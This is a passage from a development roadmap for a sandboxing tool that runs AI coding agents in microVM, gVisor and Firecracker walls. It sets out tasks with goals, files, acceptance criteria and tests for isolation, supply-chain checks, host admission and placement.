- **Docs:** a new section in `docs/how-to/sandboxes.md`.
- **CHANGELOG:** Added. "`image ls`, `image pull` and `image rm` list, get and remove the images that microvm sandboxes boot from. Your laptop pins each image by digest."
- **Depends on:** P1.3, H9.
- **Questions:** [35](isolation-spec.md#15-open-questions), [39](isolation-spec.md#15-open-questions).
- **Effort:** L.

### P3.3 The Cloud Hypervisor driver

- **Goal:** `internal/wall/chv`, with the VMM pinned at v52.0 or later in `guest/supply.lock`. That release fixes GHSA-f47p-p25q-83rh ([advisory](https://github.com/cloud-hypervisor/cloud-hypervisor/security/advisories/GHSA-f47p-p25q-83rh)).
- **The jail:** the VMM runs in a `vmm` jail. That is a subuid when one is available, with its supplementary groups kept for `/dev/kvm`. It has an empty network namespace, and a mount namespace with only the session's folder, the artefacts and `/dev/kvm`. `PR_SET_DUMPABLE` is 0. The VMM runs with `--landlock` and `--seccomp true`. Every disk has `image_type=raw` and backing files off ([threat model](https://github.com/cloud-hypervisor/cloud-hypervisor/blob/main/docs/threat-model.md)). The session disk belongs to the VMM's uid. A balloon with free page reporting returns freed pages.
- **The boot:** the kernel command line carries `dm-mod.create` with two verity tables: the tools image as `dm-0`, and the user's image as `dm-1`, with `panic_on_corruption`. It ends with `root=/dev/dm-0 ro init=/init`. The supervisor builds it only from the digests in the start request.
- **The link:** the supervisor connects to the VMM's vsock socket and sends `CONNECT 1024`. It never creates a `<socket>_<port>` listener.
- **Files:** new `internal/wall/chv/*.go`, `guest/supply.lock`, `.goreleaser.yaml` and `internal/supply` (the release mirrors the pinned VMM and names it in the release manifest), new `docs/contributing/decisions/0040-memory-of-microvm-guests.md`, the records index.
- **Acceptance:**
  - A guest that writes a QCOW2 header to its session disk and reboots reads zeros, not a host file.
  - The guest reaches no host socket, and no TCP, UDP or `AF_UNIX` endpoint.
  - The subuid keeps `/dev/kvm` access through the kvm group (UNVERIFIED until this test passes).
  - Guest memory is the session's cap minus 160 MiB, as the record 0040 states.
- **Tests:** the escape suite of P1.5 for microvm, plus the QCOW2 case. The fidelity fixtures.
- **Docs:** `docs/explanation/security.md`. The record 0040, which extends [0024](decisions/0024-memory-cap.md).
- **CHANGELOG:** Added. "The host helper gains a Cloud Hypervisor driver for microvm sandboxes. It runs the VMM confined, with no network and raw disks only."
- **Depends on:** P3.1, P3.2, P1.3, H9, [0030](decisions/0030-local-sockets-do-not-listen.md). It adds the record 0040.
- **Questions:** [3](isolation-spec.md#15-open-questions), [23](isolation-spec.md#15-open-questions).
- **Effort:** L.

### P3.4 The guest init on a microvm

- **Goal:** the guest init's work on a microvm.
  - The overlay root, reset by default, and the session disk with `/work` and the state folders.
  - The uids `holder` (900) and `agent` (1000). `sandbox.sudo = true` gives `agent` sudo with no password on a microvm, and is refused on other walls (spec 17.10, [question 60](isolation-spec.md#15-open-questions)).
  - The transparent proxy, and the synthetic DNS mode.
  - A clean shutdown with `reboot(2)`, and the `mem` claims.
- **Files:** new `internal/guest/vm_linux.go`, new `internal/guest/nft.go`, new `internal/guest/shutdown.go`.
- **Acceptance:** a file in `~/.bashrc` is gone after a stop and a start. `/work` and `~/.claude/projects` stay ([question 8](isolation-spec.md#15-open-questions)). `system = "keep"` keeps the root. The agent cannot `ptrace` the holder.
- **Tests:** unit tests. End to end.
- **Docs:** `docs/how-to/sandboxes.md`.
- **CHANGELOG:** Added. "In a microvm sandbox, the system and the home reset at each start. `/work` and the agent's history stay."
- **Depends on:** P3.3.
- **Questions:** [8](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P3.5 The agents disk

- **Goal:** a read-only image of the host's installed agents, at `/opt/agents` in the guest. A `converter` jail builds it from each agent's `InstallDirs` and binary, and names it by digest.
- **Files:** new `internal/image/agents.go`, `internal/host/agentcheck.go`.
- **Acceptance:** Claude Code and Codex start in a microvm, with no prompt sent. `agents install` on the host makes a new disk for the next start. An agent cannot update itself in the sandbox ([question 21](isolation-spec.md#15-open-questions)).
- **Tests:** unit tests.
- **Docs:** `docs/how-to/install-agents.md`.
- **CHANGELOG:** Added. "Microvm sandboxes get the host's installed agents read-only, from a disk that the host builds after `agents install`."
- **Depends on:** P3.2.
- **Questions:** [21](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P3.6 Lifecycle on a microvm

- **Goal:** the `stopped` state, wake on attach, the lazy restore, `[sandbox] idle_stop`, and disk caps.
- **Files:** new `internal/wall/chv/lifecycle.go`, `internal/host/idle.go` (`IdleDecide` for each session), `internal/supervisor/stop.go`.
- **Acceptance:**
  - A stopped microvm uses no memory.
  - A full session disk gives the agent `ENOSPC`, and the host is unharmed.
  - `idle_stop` is off by default until P3.8 ([question 9](isolation-spec.md#15-open-questions)).
  - A stop keeps no screen and makes no memory snapshot ([question 10](isolation-spec.md#15-open-questions), [question 11](isolation-spec.md#15-open-questions)).
  - The session disk is not encrypted ([question 12](isolation-spec.md#15-open-questions)).
- **Tests:** end to end. The test of a full disk uses a small disk cap.
- **Docs:** `docs/how-to/sandboxes.md`.
- **CHANGELOG:** Added. "A microvm sandbox can stop and use no memory, and it wakes when you attach. `[sandbox] idle_stop` stops idle ones, and a disk cap keeps a full sandbox from filling the host."
- **Depends on:** P3.4.
- **Questions:** [9](isolation-spec.md#15-open-questions), [10](isolation-spec.md#15-open-questions), [11](isolation-spec.md#15-open-questions), [12](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P3.7 The microvm probe, the kernel list and Lima

- **Goal:** the `chv` driver's probe, the doctor's warning for host kernels with known local root bugs, and microvm on Lima for M3 or later. The root step of this task is part of H7 and P1.5.
- **Files:** new `internal/wall/chv/probe.go`, `internal/host/doctor.go`, new `internal/host/kernel_bugs.toml` (the data list), `internal/cli/host.go`.
- **Acceptance:**
  - The sandbox probe reports the `chv` driver OK on a host with usable KVM, Linux 6.8 or later, and the VMM in the store.
  - The kvm steps of H7 now appear when `/dev/kvm` is present but not usable.
  - Doctor warns on a host kernel from the data list of known local root bugs: VsockDrop, CVE-2026-53365, and Vghost, CVE-2026-74580. Both are UNVERIFIED, from secondary sources.
  - Doctor never lowers a floor by itself ([question 7](isolation-spec.md#15-open-questions)).
  - A Lima VM on M3 or later with macOS 15 or later probes microvm OK.
- **Tests:** unit tests with fake files. End to end on a test host. A root step there runs only when its owner set `E2E_ROOT=run`.
- **Docs:** `docs/how-to/sandboxes.md`, `docs/how-to/create-a-host.md`.
- **CHANGELOG:** Added. "`host doctor` warns when a host's kernel is on the list of known local root bugs. A Lima VM on an M3 or later Mac with macOS 15 or later can run microvm sandboxes."
- **Depends on:** P3.3, H7, P0.8.
- **Questions:** [7](isolation-spec.md#15-open-questions), [37](isolation-spec.md#15-open-questions).
- **Effort:** S.

### H10 Prepare in `host add`

- **Goal:** `host add` takes a bare machine to a host with a proven wall, as spec 14.2.1 shows. It runs the sandbox probe, runtime delivery, the root step and a test boot, in that order. The launcher part of this task is in P1.8.
- **Files:**
  - `internal/cli/host.go`: `connectHost` calls prepare, with `--no-sandbox`, `--root-step` and `--images`.
  - `internal/client/config.go`: `Host.Sandbox`, with `level`, `level_after_root`, `runtime`, `arch`, `mem_total` and `prepared_at`.
  - `internal/client/ops.go` (`Conn.Prepare`).
  - `internal/host/bridge_sandbox.go` (`sandbox.prepare`: a test boot through the sandbox start).
  - The add-host sheet, in `internal/tui/wizard.go` and `internal/tui/wizard_view.go`.
- **Acceptance:**
  - On a host with KVM access, `host add` ends with "microVM wall ready" and a boot time.
  - Without KVM access, the level that the host gives now is saved and named.
  - `--no-sandbox` keeps today's flow.
  - `[host.sandbox]` in `hosts.toml` keeps the level at prepare time, as a cache.
  - The add-host sheet has the ten steps of spec 14.2.6. H4 added Tier, and this task adds Sandboxes and Root step.
- **Tests:** CLI tests with a fake transport, golden screens, and end-to-end test 1 with the test boot.
- **Docs:** `docs/how-to/add-a-host.md`, `docs/explanation/architecture.md` (3.1 and 6), `docs/contributing/ux-spec.md` (2.3 and 2.10).
- **CHANGELOG:** Added. "`host add` now prepares a host for sandboxes in the same flow. It checks what the host can run, gets the files it needs, offers the root step, and boots a test sandbox."
- **Depends on:** H7, H9, P3.4, P1.8.
- **Questions:** [2](isolation-spec.md#15-open-questions), [29](isolation-spec.md#15-open-questions), [39](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P3.8 Conformance, measurements and release

- **Goal:** the microvm wall ships.
- **Files:** `test/e2e/` (the microvm suite), `scripts/time-to-agent.sh`, `internal/client/config.go` (the idle stop default), the docs below.
- **Acceptance:**
  - The targets of spec 12 for microvm are measured on bare metal and nested, and recorded in the docs. A target that a measurement misses opens an issue.
  - With the measurements recorded, `[sandbox] idle_stop` defaults to 2 hours for microvm sandboxes ([question 9](isolation-spec.md#15-open-questions)).
  - The density check starts only the target count of idle sessions. On a test host, it never starts sessions until one fails. That is a memory stress test, which runs only under a cap of 512 MiB or less.
- **Tests:** the microvm suite. The measurements of spec 12.
- **Docs:** `docs/how-to/sandboxes.md`, `docs/explanation/architecture.md`, `docs/contributing/testing.md`.
- **CHANGELOG:** Added. "`--wall microvm` runs a session in its own virtual machine with its own kernel, on hosts with KVM and Linux 6.8 or later. It boots from images that the host checks against their digests, and keeps only its work and the agent's history between starts."
- **Depends on:** P3.1 to P3.7, H10.
- **Questions:** [2](isolation-spec.md#15-open-questions), [9](isolation-spec.md#15-open-questions).
- **Effort:** M.

## Phase 4: the project's own supply chain, and many hosts

The rule of this phase: **the laptop holds the digests, the hosts hold the bytes.** A host never decides what is trusted. Then H11 to H16 let `new` place a sandbox on any of the user's hosts, keep each host healthy, and leave a host clean. H11 to H13 replace P7.5.

### P4.2 Run verified bytes only

- **Goal:** the supervisor keeps artefacts in the store that H9 made, `DataDir()/artefacts/sha256/<digest>`. It seals them with fs-verity where the file system has it, hashes the open file, and runs the VMM from that descriptor through `/proc/self/fd/N`.
- **Files:** new `internal/supply/exec.go`, `internal/wall/chv/start.go`, `internal/client/bootstrap.go`.
- **Acceptance:** replacing the VMM file between the check and the start changes nothing that runs.
- **Tests:** unit tests.
- **Docs:** `docs/explanation/security.md`.
- **CHANGELOG:** Security. "The host runs the VMM and boots the guest kernel only from files whose digests match the client's."
- **Depends on:** P4.1, P3.3, H9.
- **Questions:** none.
- **Effort:** M.

### P4.3 Reproducible kernel and tools image

- **Goal:** `just repro` builds the kernel and the tools image twice and compares them. The kernel build fixes `KBUILD_BUILD_TIMESTAMP`, `KBUILD_BUILD_USER` and `KBUILD_BUILD_HOST`, without modules. `mkfs.erofs` runs with `-T`, `-U` and `--all-root`, and the verity salt is fixed.
- **Files:** `scripts/repro.sh`, new `guest/build.sh`, `.github/workflows/ci.yml`.
- **Acceptance:** two builds from empty caches are byte-identical.
- **Tests:** `just repro` in CI.
- **Docs:** `docs/contributing/releasing.md`, `docs/contributing/testing.md` (`just repro`).
- **CHANGELOG:** Changed. "`just repro` now also builds the guest kernel and the tools image twice, and checks that the two builds match."
- **Depends on:** P3.1.
- **Questions:** none.
- **Effort:** M.

### P4.4 A signed-tag release gate

- **Goal:** `release.yml` runs `git verify-tag` against a committed allowed-signers file before it builds. The maintainer's tag key is a hardware ed25519-sk key ([question 30](isolation-spec.md#15-open-questions)).
- **Files:** `.github/workflows/release.yml`, new `.github/tag-signers`, new `docs/contributing/decisions/0041-a-signed-tag-release-gate.md`, the records index.
- **Acceptance:** an unsigned tag fails the workflow.
- **Tests:** a script test that runs the same `git verify-tag` step on a signed and an unsigned tag in a temporary repository. Never push a tag to test the gate.
- **Docs:** `docs/contributing/releasing.md`. The record 0041, which extends [0017](decisions/0017-release-signatures.md).
- **CHANGELOG:** Security. "A release now builds only from a tag that a maintainer signed with a key in the repository's list."
- **Depends on:** nothing. It adds the record 0041.
- **Questions:** [30](isolation-spec.md#15-open-questions).
- **Effort:** S.

### P4.5 Image policy

- **Goal:** `images.lock` trusts the first digest that resolves, and shows it. A `[sandbox.image_policy]` with a cosign identity and issuer makes the client check signatures offline with `sigstore-go`.
- **Files:** `internal/client/images.go`, new `internal/supply/sigstore.go`.
- **Acceptance:** an image whose tag moved to a new digest is refused until the user accepts it. With an image policy, an image without a matching signature is refused. No host's answer changes a pinned digest ([question 35](isolation-spec.md#15-open-questions)).
- **Tests:** unit tests, with a recorded signature bundle.
- **Docs:** `docs/how-to/sandboxes.md`.
- **CHANGELOG:** Added. "Images for sandboxes are pinned by digest on your laptop, and can require a signature."
- **Depends on:** P3.2.
- **Questions:** [35](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P4.6 Known-bad versions

- **Goal:** the `advisories` list of the release manifest names VMM, kernel and terminal versions with known advisories. The client refuses a microvm start on a host whose pinned VMM is in that list, with the hint to update the helper. The terminal list feeds P7.3. A high-severity advisory gets a release within 7 days, with the list in it ([question 42](isolation-spec.md#15-open-questions)).
- **Files:** new `internal/supply/knownbad.go`, `internal/host/doctor.go` (pin ages).
- **Acceptance:** a host with an old VMM gets the refusal, and `host doctor` shows the age of each pin.
- **Tests:** unit tests.
- **Docs:** `docs/how-to/troubleshoot.md`, `docs/contributing/releasing.md` (the 7-day rule).
- **CHANGELOG:** Security. "The client refuses to start a microvm sandbox on a host whose VMM has a known advisory, and says how to update it."
- **Depends on:** P4.1, P0.9.
- **Questions:** [42](isolation-spec.md#15-open-questions).
- **Effort:** S.

### H11 Facts and admission

- **Goal:** each host reports its room, and admits or refuses each sandbox under a lock (spec 14.10.2 and 14.10.3).
- **Files:**
  - New `internal/api/facts.go` (`HostFacts`, `Need`, `Health`).
  - New `internal/host/facts.go` (`Facts`) and new `internal/host/admit.go` (`admit`).
  - `internal/host/ops.go` (`New` calls `admit`).
  - `internal/host/manifest.go` (`limits.declared`, `placed_by`, `place_reason`, `runtime`).
  - `internal/host/memsample.go` (a reader of the host's memory pressure), and `internal/agents/agents.go` (a size for each agent).
  - New `internal/client/facts.go` (`FetchFacts`).
  - `internal/tui/hosts_conn.go` (a facts request every 10 s), `internal/tui/backend.go`, and `internal/tui/hosts_view.go` (the room in `hostRow`).
  - New `docs/contributing/decisions/0042-admission-refuses-what-does-not-fit.md`, and the records index.
- **Acceptance:**
  - The launcher shows the room of each online host, and still draws at once ([0011](decisions/0011-instant-launcher.md)).
  - Two starts at once never pass the room.
  - A refusal carries fresh facts.
  - Admission counts declared memory, with no overcommit ([question 13](isolation-spec.md#15-open-questions)).
  - A sandbox with no size takes its template's size, and each agent's size in the agent table is the default ([question 14](isolation-spec.md#15-open-questions)).
  - Admission refuses with `busy`, `runtime_missing`, `level_below` and `no_room`, as spec 14.10.3 says. H14 adds `draining`.
  - `runtime_missing` is the only runtime check: the client embeds the digests, so no minimum version or expiry exists.
  - P7.5's criterion holds: the chosen host admits the session under its own lock, or answers `no_room`.
- **Tests:** admission under `hosttest` with two processes: the total never passes the room. Manifests of another boot, and of dead holders, do not count. Units of the facts. The fake backend. End-to-end test 6, its first part: sandboxes fill the room, and the next start gets `no_room`. The sandboxes stay idle, because admission counts declared memory. Any test that loads memory runs under a cap of 512 MiB or less.
- **Docs:** `docs/how-to/memory.md`. The record 0042, which amends [0024](decisions/0024-memory-cap.md) for sandboxes only.
- **CHANGELOG:** Added. "Each host now reports its free room for sandboxes, and the launcher shows it. A host refuses a sandbox that does not fit, and does not make it smaller."
- **Depends on:** P1.1, P1.5, H9. It adds the record 0042.
- **Questions:** [13](isolation-spec.md#15-open-questions), [14](isolation-spec.md#15-open-questions).
- **Effort:** M.

### H12 Named placement

- **Goal:** `new` with no host, or with `-`, uses a saved default. A full host says which hosts have room (spec 14.10.1 and 14.10.4).
- **Files:**
  - `internal/cli/session.go` (the grammar of `newCmd`), and `internal/cli/host.go` (a new `hostDefaultCmd`).
  - New `internal/client/place.go` (`ResolveHost`).
  - `internal/client/config.go` (`hostsFile.Default`, `ValidHostName`), and `internal/client/tier.go` (a `shared` host cannot be the default).
  - `internal/tui/actions.go` (`newSessionHost`) and `internal/tui/dialog.go` (the host row).
- **Acceptance:**
  - `new` picks the host in the order of spec 14.10.1. `SIMSTIM_DEFAULT_HOST` overrides `default`.
  - The errors of spec 14.14 cover these cases.
  - `n` in the launcher, with a default host, opens the new-session dialog.
  - `auto`, and any name that starts with `-`, cannot name a host.
  - A `shared` host cannot be the default.
- **Tests:** the `ResolveHost` table, with `auto`, `-`, two words before `--`, and `--` first. CLI tests of the grammar. A model test.
- **Docs:** `docs/contributing/ux-spec.md` (6), the reference through `just docs` for `host default` and `SIMSTIM_DEFAULT_HOST`.
- **CHANGELOG:** Added. "`new` without a host uses your default host, which `host default` sets. When a host has no room, the error names the hosts that have room."
- **Depends on:** H11, H4, H5.
- **Questions:** none.
- **Effort:** S.

### H13 `new auto`

- **Goal:** the client picks a host from live facts, explains why, and moves on when a host refuses (spec 14.10.5). P7.5's goal holds: `new` picks a host by floor, labels and free memory, from a quick facts request to each host.
- **Files:**
  - `internal/client/place.go` (`Filter`, `Rank`, `Explain`, `Place`, the placements).
  - `internal/client/config.go` (`[placement]`, `Host.Place`).
  - `internal/client/machine.go` (the wake cost) and `internal/client/provider.go` (`Provider.Cost`).
  - `internal/cli/session.go` (`auto`, `--need`, `--dry-run`, `--wake`, and the placement in `ls --json`).
  - `internal/cli/host.go` (`host default auto`) and `internal/tui/dialog.go` (`auto` in the host row).
- **Acceptance:**
  - The dry run prints the table of spec 14.2.5, and starts nothing.
  - A burst of 10 starts from one script spreads over the hosts that fit.
  - A paid wake asks.
  - Facts that disagree with `[host.sandbox]` drop a host.
  - `auto` never picks the `process` level ([question 5](isolation-spec.md#15-open-questions)). Its minimum level is `microvm`, or the level that `--wall` or the config names. `gvisor` is the weakest level that `auto` takes.
  - The client never contacts a host outside the pool. The pool follows the tier rows of spec 14.8.2.
  - Each placement is recorded. `ls --json` shows its `placed_by` and `place_reason`.
  - P7.5's criterion holds: the facts request is `host.facts`.
- **Tests:** tables for each rule of spec 14.10.5. `Place` with fake connections that refuse with `no_room` and then accept, and a host that hangs past the deadline. Golden output of the dry run.
- **Docs:** new `docs/how-to/open-a-sandbox-on-any-host.md` ("Open a sandbox on any of your hosts"). The reference through `just docs` for `[placement]` and `[host.place]`.
- **CHANGELOG:** Added. "`new auto` picks one of your hosts for a sandbox from their live room, cached images and round trips. `--dry-run` shows why it chose that host."
- **Depends on:** H12, H5, P3.8.
- **Questions:** [5](isolation-spec.md#15-open-questions).
- **Effort:** M.

### H14 Health, runtime upgrades and drain

- **Goal:** each host says what is wrong with it, gets runtime fixes, and can be drained (spec 14.11).
- **Files:**
  - New `internal/host/health.go`, and new `internal/host/drain.go` (`SetDrain`).
  - `internal/host/facts.go`, and `internal/host/admit.go` (`draining`).
  - `internal/client/runtime.go` (upgrade on use).
  - `internal/cli/host.go`: new `hostDrainCmd` and `hostUndrainCmd`, and health in `host ls` and `host doctor`.
  - `internal/cli/session.go` (`outdated` and `exposed` in `ls`), and `internal/tui/hosts_view.go`.
- **Acceptance:**
  - Each item of spec 14.11.1 shows when its condition holds.
  - The client adds `runtime-missing` when the host lacks a runtime file that its release manifest names. It is `blocks_new` for the microvm level. No item checks a minimum version or an expiry, because the client embeds the digests.
  - The `advisory` item and the `exposed` mark read the `advisories` list of P4.6.
  - A drained host refuses new sandboxes with `draining`, and keeps running ones.
  - An `own` host gets a new VMM on its next `new` without a question. A `shared` host asks.
  - Running sandboxes keep their runtime. `ls` marks a session `outdated` when its runtime is older than the client's.
- **Tests:** units of health, with fixtures. Drain under `hosttest`. End-to-end test 6, its drain part: while drained, a start gets `draining`. The test removes the drain mark at its end, and the log records both changes.
- **Docs:** new `docs/how-to/restart-a-host.md` ("Restart a host"), `docs/explanation/architecture.md` (3.8), the reference through `just docs`.
- **CHANGELOG:** Added. "Each host reports its health, such as a missed runtime update or low disk, in `host ls`, `host doctor` and the launcher. `host set <host> drain=<reason>` stops new sandboxes on a host before a restart, and `drain=off` ends the drain."
- **Depends on:** H11, H9, P4.6.
- **Questions:** [42](isolation-spec.md#15-open-questions).
- **Effort:** M.

### H15 Leave and wipe

- **Goal:** `host rm --purge` removes everything that the tool put on a host, and says what it could not remove (spec 14.12).
- **Files:**
  - New `internal/host/footprint.go` and new `internal/host/purge.go`.
  - Footprint entries in `internal/host/doctor.go` (`Setup`), `internal/host/fix.go` (`InstallRestoreUnit`, `installTerminfo`) and `internal/host/idle.go` (`IdleSetup`).
  - Footprint entries in `internal/host/memory.go` (`limitSessions`) and `internal/host/restore.go`.
  - `internal/client/ops.go` (`Conn.Purge`), and new `internal/client/baseline.go`.
  - `internal/cli/host.go`: `--purge`, `--force`, `--root-step`, and the consent text in `connectHost`.
- **Acceptance:**
  - The purge follows the steps of spec 14.12.
  - The root step's undo runs, prints or skips by the modes of H7.
  - A worktree with unsaved work stops the purge, unless `--force`.
- **Tests:** the purge test under `hosttest`: the files in the home folder after `host add` and then `host rm --purge` are the same as before `host add`. Units of the footprint. A test that a worktree with unsaved work stops the purge. End-to-end test 7 runs only on a host that the test creates and deletes, such as one from `host create docker` in CI. A purge stops every session on its host, so it never runs on a shared test host.
- **Docs:** `docs/how-to/uninstall.md` becomes one command. It keeps the manual steps for a host that the client cannot reach.
- **CHANGELOG:** Added. "`host rm --purge` removes everything that simstim put on a host, after a question: sessions, files, units, the root step and agent logins. It lists the secrets to rotate, and any change that it cannot explain."
- **Depends on:** H7, H5, H9.
- **Questions:** [29](isolation-spec.md#15-open-questions).
- **Effort:** M.

### H16 Reach a host behind NAT

- **Goal:** the docs give safe ways to reach a host behind NAT, and `host doctor` names the route (spec 14.13). The tool runs no tunnel and no relay ([0031](decisions/0031-the-egress-process-is-not-a-relay.md)).
- **Files:** new `docs/how-to/reach-a-host-behind-nat.md`, new `internal/client/route.go` (the route from `ssh -G`), `internal/cli/host.go` (`hostDoctorCmd`), `internal/tui/hosts_view.go` (`hostDetail`).
- **Acceptance:**
  - The guide gives the four paths of spec 14.13, each with a tested config block on example.com names and 192.0.2.0/24 addresses.
  - The reverse-tunnel recipe uses only a machine that the user owns, and states its owner's consent ([question 36](isolation-spec.md#15-open-questions)).
  - `host doctor` and the launcher's details line show the route word.
- **Tests:** a table of `ssh -G` outputs.
- **Docs:** the new how-to, and `docs/explanation/architecture.md` (8.3).
- **CHANGELOG:** Added. "A new guide shows safe ways to reach a host behind NAT. `host doctor` names the route it uses: direct, a jump host, a proxy command or a tailnet."
- **Depends on:** H3, H9, [0031](decisions/0031-the-egress-process-is-not-a-relay.md).
- **Questions:** [36](isolation-spec.md#15-open-questions).
- **Effort:** S.

## Phase 5: fork, copy and save

### P5.1 Fork

- **Goal:** spec 6.5, with the agent table's `Fork`.
- **Files:** new `internal/supervisor/fork.go`, new `internal/guest/freeze.go`, new `internal/cli/fork.go`, `internal/agents/agents.go` (a new field `Fork`).
- **Acceptance:** `fork --count 3` makes three sessions that each start a forked conversation. A fork copies files, never memory ([question 11](isolation-spec.md#15-open-questions)).
- **Tests:** unit tests. End to end, with a test agent whose fork command is a script. A real agent's fork needs a conversation, so it is a manual check.
- **Docs:** new `docs/how-to/fork.md`.
- **CHANGELOG:** Added. "`fork` copies a sandboxed session into new ones, each with a copy of the conversation."
- **Depends on:** P3.6.
- **Questions:** [11](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P5.2 Copy files in and out

- **Goal:** `cp` over `put` and a new `get` stream kind, with a size cap. It never follows a symlink on the host side, and it flags files that run code for a review. It opens every path with `os.Root` on both sides and never extracts a tar: Docker Sandboxes' `cp` followed planted symlinks (CVE-2026-103916), and its tar extraction wrote outside its target (CVE-2026-17106). A test plants both cases.
- **Files:** `internal/link/link.go` (`KindGet`), new `internal/supervisor/cp.go`, new `internal/cli/cp.go`.
- **Acceptance:** `cp` copies a file into a sandbox and out of it. A file above the cap is refused. A symlink on the host side is never followed. A file that runs code, such as a git hook, gets a review flag.
- **Tests:** unit tests of the cap and of the symlink cases. End to end.
- **Docs:** new `docs/how-to/copy-files.md`.
- **CHANGELOG:** Added. "`cp` copies files into and out of a sandbox."
- **Depends on:** P1.9.
- **Questions:** none.
- **Effort:** M.

### P5.4 Checkpoints

- **Goal:** a copy of the session disk at each `turn_done` where the file system has reflinks, and `rewind <host>/<session> [n]`.
- **Files:** new `internal/supervisor/checkpoint.go`, new `internal/cli/rewind.go`.
- **Acceptance:** on XFS or Btrfs, a checkpoint takes under a second. On ext4, checkpoints are off, and `host show` says why.
- **Tests:** unit tests. End to end on a host with XFS or Btrfs, where the owner of a test host has one.
- **Docs:** `docs/how-to/sandboxes.md`.
- **CHANGELOG:** Added. "On hosts whose disks support it, a sandbox keeps a checkpoint after each turn, and `rewind` goes back to one."
- **Depends on:** P3.6.
- **Questions:** none.
- **Effort:** M.

### P5.5 Save an image

- **Goal:** `image save` turns a microvm session's root changes into a new image. A review first flags shell start files, git hooks and folders on `PATH`, and a scan looks for the session's secret values.
- **Files:** new `internal/image/save.go`, `internal/cli/image.go` (`image save`).
- **Acceptance:** `image save` makes an image only after the review. It refuses every agent's `LoginFiles` and the paste guard's credential paths, so a login made inside the sandbox never enters an image. A session's secret value in the changes stops the save. The image stays on the host that made it, and the launcher marks it "made on <host>". The laptop records its digest in `images.lock` for that host only, and never sends the image or its digest to another host (spec 14.9.5).
- **Tests:** unit tests of the review and of the scan.
- **Docs:** `docs/how-to/sandboxes.md`.
- **CHANGELOG:** Added. "`image save` makes an image from a sandbox's system changes, after you review them."
- **Depends on:** P3.2.
- **Questions:** 35.
- **Effort:** M.

## Phase 6: more walls, one path

### P6.1 The gvisor wall

- **Goal:** `internal/wall/gvisor`, with `runsc` pinned and mirrored, in the OCI user-namespace mode. Not `--rootless`, which refuses `create` and the sandbox's own network stack ([gVisor](https://gvisor.dev/docs/user_guide/rootless/)). It runs with `--network=none`, `--directfs=false` and `--ignore-cgroups`, and the link comes through `--pass-fd`. An EROFS root comes once gVisor fixes the overlay issue ([#13529](https://github.com/google/gvisor/issues/13529)).
- **Files:** new `internal/wall/gvisor/*.go`, `guest/supply.lock` (`runsc`), `.goreleaser.yaml` and `internal/supply` (the release mirrors `runsc` and names it in the release manifest).
- **Acceptance:** the escape suite and the fidelity fixtures pass. The time of `npm install` is measured against the process wall. A host without KVM pins `gvisor` as its floor when it probes OK ([question 2](isolation-spec.md#15-open-questions)).
- **Tests:** the escape suite and the fidelity fixtures for the gvisor driver.
- **Docs:** `docs/how-to/sandboxes.md`.
- **CHANGELOG:** Added. "`--wall gvisor` puts gVisor's kernel between a sandbox and the host's kernel, on hosts without KVM."
- **Depends on:** P1.5, H9.
- **Questions:** [2](isolation-spec.md#15-open-questions).
- **Effort:** L.

### P6.2 The Firecracker driver

- **Goal:** microvm on host kernels 5.10, 6.1 and 6.18, with Firecracker 1.17.0 or later. Versions up to 1.16.1 let guest root read or change the Firecracker process's memory, CVE-2026-122192 ([AWS](https://aws.amazon.com/security/security-bulletins/2026-169-aws/)). It uses the default MMIO transport only, because CVE-2026-5747 hit the PCI transport ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-5747)). It runs without the jailer, which needs root, in the same `vmm` jail. It needs no folder sharing, because Firecracker has no virtio-fs.
- **Files:** new `internal/wall/firecracker/*.go`, `guest/supply.lock`, `.goreleaser.yaml` and `internal/supply` (the Firecracker entry).
- **Acceptance:** the escape suite and the fidelity fixtures pass on one of those kernels. The driver refuses the PCI transport.
- **Tests:** the escape suite and the fidelity fixtures for the Firecracker driver. Unit tests of its probe.
- **Docs:** `docs/how-to/sandboxes.md`.
- **CHANGELOG:** Added. "`--wall microvm` also runs on hosts with Linux 5.10, 6.1 or 6.18, with Firecracker."
- **Depends on:** P3.8.
- **Questions:** [3](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P6.4 Nitro Sandboxes on EC2

- **Goal:** the `nitro` driver of spec 5.1, at the `microvm` level, with spec 11 and the EC2 example of spec 14.2.4.
  - Firecracker 1.18.0 or later, in direct mode, through `/dev/nitro_enclaves` instead of `/dev/kvm`. The guest has no network device, and the link runs over vsock, as on every microvm.
  - A guest kernel in the boot pair with an EFI stub, ACPI and virtio-pci, for x86_64 and arm64. Firecracker builds the boot image in memory from it.
  - The probe's Nitro facts, the root steps `nitro-acl`, `nitro-udev` and `nitro-slots`, and `host prepare --nitro-slots`.
  - Admission with the Nitro limits of spec 14.10.3. `nitro` wins over `chv` where both pass.
- **Files:** new `internal/wall/nitro/*.go`, on the Firecracker client of P6.2. The guest kernel's config in `guest/`, `guest/supply.lock`, `internal/supply` (the Firecracker 1.18 entry), the sandbox probe, the root step builder of H7, and admission.
- **Acceptance:**
  - On one Graviton and one x86_64 EC2 instance, launched with the enclave option and Amazon Linux 2023 `kernel6.18`, the escape suite and the fidelity fixtures pass at `--wall microvm` with the `nitro` driver.
  - The probe reports the device, the pools and the vCPU budget. `nitro-acl` opens the device without a reboot.
  - Admission refuses a sandbox past the vCPU budget, the slot budget or the Nitro memory pool, with `no_room`.
  - The pull request reports the time from start to the holder's answer, and whether donated memory counts in the session's cgroup.
- **Tests:** the escape suite and the fidelity fixtures for `nitro`, unit tests of its probe and of the admission limits, and an end-to-end run on an instance that its owner provides as `E2E_HOST`. The task never launches or terminates an instance.
- **Docs:** `docs/how-to/sandboxes.md` (EC2 hosts: the instance types, the enclave option, Amazon Linux 2023 and the root step).
- **CHANGELOG:** Added. "`--wall microvm` runs on EC2 instances that support Nitro Enclaves, Graviton included, through AWS Nitro Sandboxes, with no nested virtualisation."
- **Depends on:** P6.2, P3.1, H7, H9.
- **Questions:** [53](isolation-spec.md#15-open-questions), [54](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P6.3 Unwalled sessions on the supervisor's path

- **Goal:** a `none` driver that runs the guest init with no namespaces, so that every new session has one code path. The old path stays only for sessions that run when the helper updates.
- **Files:** new `internal/wall/none/*.go`, `internal/host/ops.go`, `internal/host/walled.go`.
